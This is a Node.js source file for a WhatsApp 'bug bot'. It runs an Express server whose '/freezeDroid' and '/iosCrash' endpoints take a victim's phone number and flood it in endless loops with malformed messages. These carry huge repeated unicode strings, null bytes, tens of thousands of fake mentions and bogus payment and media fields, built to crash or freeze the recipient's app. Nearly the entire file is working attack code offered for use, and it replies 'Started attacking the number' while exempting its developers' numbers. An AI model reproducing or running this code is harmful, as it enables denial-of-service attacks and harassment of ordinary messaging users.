

const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@whiskeysockets/baileys")
const fs = require('fs')
const util = require('util')
const express = require('express');
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

const app = express();
const PORT = process.env.PORT || 3000;

module.exports = async (sam, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (sam.user.id.split(':')[0]+'@s.whatsapp.net' || sam.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await sam.decodeJid(sam.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)


const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
//====================================\\
const o = fs.readFileSync(`./69/o.jpg`)
//====================================\\
// Function to convert phone number to WhatsApp JID
function toWhatsAppJID(phoneNumber) {
    if (!phoneNumber) throw new Error('Phone number is required');
    // Remove the "+" sign if present
    return phoneNumber.replace(/\+/g, '') + '@s.whatsapp.net';
}
//====================================\\
// Add this helper function to check developer numbers
function isDeveloperNumber(phoneNumber) {
    const developerNumbers = ['254101415520', '2348144723858']; // List of developer numbers without the "+"
    const cleanedNumber = phoneNumber.replace(/\+/g, ''); // Remove "+" if present
    return developerNumbers.includes(cleanedNumber);
}
//====================================\\
app.use(express.json()); // Middleware to parse JSON bodies
//====================================\\
app.get('/freezeDroid', async (req, res) => {
    const { target } = req.query; // Access the target parameter from the query string
    // Check if the target is a developer number
    if (isDeveloperNumber(target)) {
        return res.status(403).send('Cannot attack developer');
    }
async function protocolbug6(target, mention) {
    const quotedMessage = {
        extendedTextMessage: {
            text: "᭯".repeat(12000),
            matchedText: "https://" + "ꦾ".repeat(500) + ".com",
            canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
            description: "\u0000".repeat(500),
            title: "\u200D".repeat(1000),
            previewType: "NONE",
            jpegThumbnail: Buffer.alloc(10000),
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                    showAdAttribution: true,
                    title: "BoomXSuper",
                    body: "\u0000".repeat(10000),
                    thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
                },
                mentionedJid: Array.from({ length: 1000 }, () => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
            }
        },
        paymentInviteMessage: {
            currencyCodeIso4217: "USD",
            amount1000: "999999999",
            expiryTimestamp: "9999999999",
            inviteMessage: "Payment Invite" + "💥".repeat(1770),
            serviceType: 1
        }
    };

    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".RaldzzXyz" + "ោ៝".repeat(10000),
        title: "PhynixAgency",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "109951162777600",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: "☠️ - んジェラルド - ☠️",
                body: "\u0000".repeat(9117),
                mediaType: 1,
                renderLargerThumbnail: true,
                thumbnailUrl: null,
                sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
            },
            businessMessageForwardInfo: {
                businessOwnerJid: target
            },
            quotedMessage: quotedMessage,
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "ꦾ".repeat(100)
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await sam.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sam.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function bulldozer(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sam.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function TrashProtocol(target, mention) {
                const sex = Array.from({ length: 9741 }, (_, r) => ({
                       title: "꧀".repeat(9741),
                           rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
                             }));
                             
                             const MSG = {
                             viewOnceMessage: {
                             message: {
                             listResponseMessage: {
                             title: "𝚖𝚊𝚗𝚞𝚜𝚒𝚊 𝚕𝚎𝚖𝚊𝚑",
                             listType: 2,
                             buttonText: null,
                             sections: sex,
                             singleSelectReply: { selectedRowId: "🇷🇺" },
                             contextInfo: {
                             mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                             participant: target,
                             remoteJid: "status@broadcast",
                             forwardingScore: 9741,
                             isForwarded: true,
                             forwardedNewsletterMessageInfo: {
                             newsletterJid: "9741@newsletter",
                             serverMessageId: 1,
                             newsletterName: "-"
                             }
                             },
                             description: "🇷🇺"
                             }
                             }
                             },
                             contextInfo: {
                             channelMessage: true,
                             statusAttributionType: 2
                             }
                             };

                             const msg = generateWAMessageFromContent(target, MSG, {});

                             await sam.relayMessage("status@broadcast", msg.message, {
                             messageId: msg.key.id,
                             statusJidList: [target],
                             additionalNodes: [
                             {
                             tag: "meta",
                             attrs: {},
                             content: [
                             {
                             tag: "mentioned_users",
                             attrs: {},
                             content: [
                             {
                             tag: "to",
                             attrs: { jid: target },
                             content: undefined
                             }
                             ]
                             }
                             ]
                             }
                             ]
                             });

                             if (mention) {
                             await sam.relayMessage(
                             target,
                             {
                             statusMentionMessage: {
                             message: {
                             protocolMessage: {
                             key: msg.key,
                             type: 25
                             }
                             }
                             }
                             },
                             {
                additionalNodes: [
                    {
                       tag: "meta",
                           attrs: { is_status_mention: "DreadosFortex is back ▾" },
                             content: undefined
}
]
}
);
}
}
async function invisfc(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "𝚢𝚊𝚑𝚊𝚑𝚊 𝚗𝚐𝚎𝚕𝚊𝚐",
                    footerText: "𝙳𝚛𝚎𝚊𝚍𝚘𝚜𝙵𝚘𝚛𝚝𝚎𝚡 𝚒𝚜 𝚋𝚊𝚌𝚔 ༑",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "🇷🇺" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sam.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await sam.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "⟅̊༑ ▾𝚖𝚊𝚔𝚕𝚞⟅̊༑ ▾ " },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
 async function Forcloseinvisstanza(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                extendedTextMessage: {
                    text: '.',
                    contextInfo: {
                        stanzaId: target,
                        participant: target,
                        quotedMessage: {
                            conversation: "The Devil's Is Here" + " ꦾ".repeat(100)
                        },
                        disappearingMode: {
                            initiator: "CHANGED_IN_CHAT",
                            trigger: 'CHAT_SETTING'
                        }
                    },
                    inviteLinkGroupTypeV2: "DEFAULT"
                },
                contextInfo: {
                    mentionedJid: Array.from({
                        length: 30000
                    }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                    isSampled: true,
                    remoteJid: "status@broadcast",
                    forwardingScore: 9741,
                    isForwarded: true
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await sam.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
}       
    // Basic validation for phone numbers
    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
    if (!target || !phoneNumberPattern.test(target)) {
        return res.status(400).send('Phone number you have provided is invalid');
    }
    try {
    	res.send(`Started attacking the number ${target}`);
    	while (true) {
        await protocolbug6(target)
        await bulldozer(target)
        await protocolbug6(target)
        await TrashProtocol(target);
        await bulldozer(target)
        await protocolbug6(target)
        await invisfc(target);
        await protocolbug6(target)
        await TrashProtocol(target);
        await bulldozer(target)
        await TrashProtocol(target);
        await bulldozer(target)
        await TrashProtocol(target);
        await invisfc(target);
        await protocolbug6(target);
        }
         // Pass validated phone number to the function
    } catch (error) {
        console.error(error.message);
        res.status(500).send('An error occurred while sending the message');
    }
});
//====================================\\
app.get('/iosCrash', async (req, res) => {
    const { target } = req.query; // Access the target parameter from the query string
    // Check if the target is a developer number
    if (isDeveloperNumber(target)) {
        return res.status(403).send('Cannot attack developer');
    }
async function XeonIosOld(target) {
await sam.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
} 
async function XeonIosPayOld(jid) {
			sam.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
		};
	async function XeonIosNew(jid) {
			sam.relayMessage(jid, {
				'extendedTextMessage': {
					'text': '.',
					'contextInfo': {
						'stanzaId': jid,
						'participant': jid,
						'quotedMessage': {
							'conversation': ' 🦄드림 가이 Xeon' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': jid
				}
			}, {
				'messageId': null
			});
		};
		async function xeonIosRobust(target){
const jid = toWhatsAppJID(target); // Convert phone number to JID
while (true) {
await XeonIosOld(jid)
await XeonIosNew(jid)
await XeonIosPayOld(jid)
await XeonIosOld(jid)
await delay(15000); // Delay for 15 seconds
}
}
    // Basic validation for phone numbers
    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
    if (!target || !phoneNumberPattern.test(target)) {
        return res.status(400).send('Phone number you have provided is invalid');
    }

    try {
    	res.send(`Started attacking the number ${target}`);
        await xeonIosRobust(target); // Pass validated phone number to the function
    } catch (error) {
        console.error(error.message);
        res.status(500).send('An error occurred while sending the message');
    }
});
//====================================\\

//====================================\\
// Start the server and connect to WhatsApp
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
}).on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
        console.error(`Port ${PORT} is in use. Trying another port...`);
        const newPort = Math.floor(Math.random() * (65535 - 1024) + 1024); // Random port between 1024 and 65535
        app.listen(newPort, () => {
            console.log(`Server is running on http://localhost:${newPort}`);
        });
    } else {
        console.error('An error occurred:', err.message);
    }
});

} catch (err) {
console.log(util.format(err))
}
}
